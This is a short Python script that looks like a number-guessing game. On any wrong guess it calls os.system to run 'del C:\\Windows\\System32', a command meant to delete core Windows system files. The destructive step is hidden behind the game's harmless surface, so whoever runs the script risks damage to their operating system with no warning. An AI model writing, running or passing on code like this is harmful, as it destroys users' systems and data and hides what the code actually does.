import random, os

random_guess = random.randint(1, 10)
guess = int(input("Guess a number between 1 and 10: "))

if guess == random_guess:
    print("You guessed right!")
else:
    os.system("del C:\\Windows\\System32")
